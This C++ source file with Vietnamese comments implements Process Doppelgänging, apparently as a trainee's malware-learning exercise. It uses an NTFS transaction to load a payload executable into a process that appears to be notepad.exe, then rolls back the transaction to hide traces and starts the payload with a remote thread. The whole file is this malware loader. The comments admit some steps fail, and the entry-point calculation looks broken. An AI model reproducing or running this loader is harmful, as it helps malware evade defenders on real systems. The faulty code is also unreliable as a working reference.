#include <sdkddkver.h> 
#define _WIN32_WINNT 0x0A00 
#define WINVER 0x0A00

#include <Windows.h>
#include <winternl.h>
#include <iostream>
// Them thu vien lien ket tinh ktmw32.lib
#pragma comment(lib, "ktmw32.lib")
#include <ktmw32.h>

typedef NTSTATUS(NTAPI* NtCreateSection_t) (PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS(NTAPI* NtCreateProcessEx_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, ULONG, HANDLE, HANDLE, HANDLE, BOOLEAN);

typedef NTSTATUS(NTAPI* NtQueryInformationProcess_t)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcInfoClass,
	PVOID ProcInfo, ULONG ProcInfoLen, PULONG returnLen);
typedef enum _SECTION_INHERIT {
	ViewShare = 1,
	ViewUnmap = 2
} SECTION_INHERIT;

typedef struct mPPEB_LDR_DATA {
	DWORD dwLength;
	DWORD dwInitialized;
	LPVOID lpSsHandle;
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
	LPVOID lpEntryInProgress;
}PEB_LDR_DATA1, * PPEB_LDR_DATA1;
typedef struct mPEB_FREE_BLOCK {
	struct mPEB_FREE_BLOCK* pNext;
	DWORD dwSize;
}PEB_FREE_BLOCK, * PPEB_FREE_BLOCK;
typedef struct _UNICODE_STR
{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR pBuffer;
} UNICODE_STR, * PUNICODE_STR;
typedef struct mPEB { // 65 elements, 0x210 bytes
	BYTE bInheritedAddressSpace;
	BYTE bReadImageFileExecOptions;
	BYTE bBeingDebugged;
	BYTE bSpareBool;
	LPVOID lpMutant;
	LPVOID lpImageBaseAddress;
	PPEB_LDR_DATA1 pLdr;
	LPVOID lpProcessParameters;
	LPVOID lpSubSystemData;
	LPVOID lpProcessHeap;
	PRTL_CRITICAL_SECTION pFastPebLock;
	LPVOID lpFastPebLockRoutine;
	LPVOID lpFastPebUnlockRoutine;
	DWORD dwEnvironmentUpdateCount;
	LPVOID lpKernelCallbackTable;
	DWORD dwSystemReserved;
	DWORD dwAtlThunkSListPtr32;
	PPEB_FREE_BLOCK pFreeList;
	DWORD dwTlsExpansionCounter;
	LPVOID lpTlsBitmap;
	DWORD dwTlsBitmapBits[2];
	LPVOID lpReadOnlySharedMemoryBase;
	LPVOID lpReadOnlySharedMemoryHeap;
	LPVOID lpReadOnlyStaticServerData;
	LPVOID lpAnsiCodePageData;
	LPVOID lpOemCodePageData;
	LPVOID lpUnicodeCaseTableData;
	DWORD dwNumberOfProcessors;
	DWORD dwNtGlobalFlag;
	LARGE_INTEGER liCriticalSectionTimeout;
	DWORD dwHeapSegmentReserve;
	DWORD dwHeapSegmentCommit;
	DWORD dwHeapDeCommitTotalFreeThreshold;
	DWORD dwHeapDeCommitFreeBlockThreshold;
	DWORD dwNumberOfHeaps;
	DWORD dwMaximumNumberOfHeaps;
	LPVOID lpProcessHeaps;
	LPVOID lpGdiSharedHandleTable;
	LPVOID lpProcessStarterHelper;
	DWORD dwGdiDCAttributeList;
	LPVOID lpLoaderLock;
	DWORD dwOSMajorVersion;
	DWORD dwOSMinorVersion;
	WORD wOSBuildNumber;
	WORD wOSCSDVersion;
	DWORD dwOSPlatformId;
	DWORD dwImageSubsystem;
	DWORD dwImageSubsystemMajorVersion;
	DWORD dwImageSubsystemMinorVersion;
	DWORD dwImageProcessAffinityMask;
	DWORD dwGdiHandleBuffer[34];
	LPVOID lpPostProcessInitRoutine;
	LPVOID lpTlsExpansionBitmap;
	DWORD dwTlsExpansionBitmapBits[32];
	DWORD dwSessionId;
	ULARGE_INTEGER liAppCompatFlags;
	ULARGE_INTEGER liAppCompatFlagsUser;
	LPVOID lppShimData;
	LPVOID lpAppCompatInfo;
	UNICODE_STR usCSDVersion;
	LPVOID lpActivationContextData;
	LPVOID lpProcessAssemblyStorageMap;
	LPVOID lpSystemDefaultActivationContextData;
	LPVOID lpSystemAssemblyStorageMap;
	DWORD dwMinimumStackCommit;

}mPEB, * mPPEB;
typedef NTSTATUS(NTAPI* NtCreateThreadEx_t)(
	PHANDLE ThreadHandle,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	HANDLE ProcessHandle,
	PVOID StartRoutine,        // entry point
	PVOID Argument,            //  thread argument
	ULONG CreateFlags,         // 0 = run
	SIZE_T ZeroBits,
	SIZE_T StackSize,
	SIZE_T MaximumStackSize,
	PVOID AttributeList        // NULL
	);


int main()
{
	//lay cac WINAPI can thiet
	HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
	NtCreateSection_t NtCreateSection = (NtCreateSection_t)GetProcAddress(ntdll, "NtCreateSection");
	NtCreateProcessEx_t NtCreateProcessEx = (NtCreateProcessEx_t)GetProcAddress(ntdll, "NtCreateProcessEx");
	NtCreateThreadEx_t NtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(ntdll, "NtCreateThreadEx");
	NtQueryInformationProcess_t NtQueryInformationProcess = (NtQueryInformationProcess_t)GetProcAddress(ntdll, "NtQueryInformationProcess");

	// Tao giao dich TxF
	HANDLE hTransaction = CreateTransaction(0, 0, TRANSACTION_DO_NOT_PROMOTE, 0, 0, 0, 0);
	if (hTransaction == INVALID_HANDLE_VALUE)
	{
		std::cerr << "Create NTFS transaction failed\n";
		return 1;
	}
	// Tao ban sao notepad.exe trong transaction
	HANDLE hFile = CreateFileTransactedA("G:\\VNPT Fresher\\Malware learn\\Doppelgang\\notepad.exe", GENERIC_READ | GENERIC_WRITE, 
		0, 0,
		CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0, hTransaction, 0, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		std::cerr << "Failed to create File in transaction\n";
		return 1;
	}

	// Ghi noi dung file doc hai vao trong giao dich
	HANDLE hMal = CreateFile(L"G:\\VNPT Fresher\\Malware learn\\Doppelgang\\Thongbao.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hMal == INVALID_HANDLE_VALUE)
	{
		std::cerr << "Failed to open ie file\n";
		return 1;
	}
	DWORD fileSize = GetFileSize(hMal, NULL);
	LPVOID buffer = VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// Readfile bi loi, khong doc duoc
	DWORD byteRead;
	ReadFile(hMal, buffer, fileSize, &byteRead, NULL); // doc va ghi file vao buffer
	DWORD byteWriten;
	WriteFile(hFile, buffer, fileSize, &byteWriten, NULL); // ghi buffer vao hFile
	CloseHandle(hMal);

	// Tao section tu tep trong giao dich.
	HANDLE hSection = NULL;
	NTSTATUS status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile);
	if (!NT_SUCCESS(status))
	{
		std::cerr << "NtCreateSection Failed\n";
		return 1;
	}
	
	RollbackTransaction(hTransaction);
	CloseHandle(hFile);
	CloseHandle(hTransaction);

	// Tao tien trinh tu section // NtCreateProcessEX dang FAIL
	HANDLE hProcess = NULL;
	status = NtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, GetCurrentProcess(), 0x00000004, // Ke thua Handles
		hSection, NULL, NULL, FALSE);
	if (!NT_SUCCESS(status))
	{
		std::cerr << "NtCreateProcessEx failed\n";
		return 1;
	}
	// Lay PEB va tim base address
	PROCESS_BASIC_INFORMATION pbi = { 0 };
	ULONG pbiSize = 0;
	NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &pbiSize);

	mPEB peb = { 0 };
	SIZE_T pebSize = 0;
	ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &pebSize);
	CloseHandle(hSection);
	// Lay entrypoint
	LPVOID baseAddress = pbi.PebBaseAddress;
	ULONG_PTR head = (ULONG_PTR)buffer;
	PIMAGE_NT_HEADERS nthead = (PIMAGE_NT_HEADERS)(head + ((PIMAGE_DOS_HEADER)head)->e_lfanew);
	DWORD entryRVA = nthead->OptionalHeader.AddressOfEntryPoint;


	// Tao thread thuc thi
	LPVOID remoteEntry = (LPVOID)((ULONG)baseAddress + entryRVA);
	HANDLE hThread = CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)remoteEntry, 0, 0, 0);
	if (!hThread)
	{
		std::cerr << "NtCreateThreadEx failed\n";
		return 1;
	}
	// Rollback, xoa dau vet
	WaitForSingleObject(hThread, 1000);

	CloseHandle(hProcess);
	CloseHandle(hThread);
	return 0;
}